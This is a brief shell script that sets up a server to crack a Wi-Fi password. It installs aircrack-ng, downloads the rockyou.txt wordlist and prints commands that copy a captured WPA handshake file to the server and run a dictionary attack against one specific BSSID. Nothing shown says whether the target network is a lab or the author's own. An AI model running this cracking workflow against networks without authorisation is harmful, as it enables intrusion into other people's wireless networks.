sudo apt update
sudo apt install aircrack-ng
curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

ip=$(curl icanhazip.com)

echo "run: scp psk-01.cap root@${ip}:/root"

echo "run: aircrack-ng -b E4:57:40:35:AA:46 -w rockyou.txt psk-01.cap"
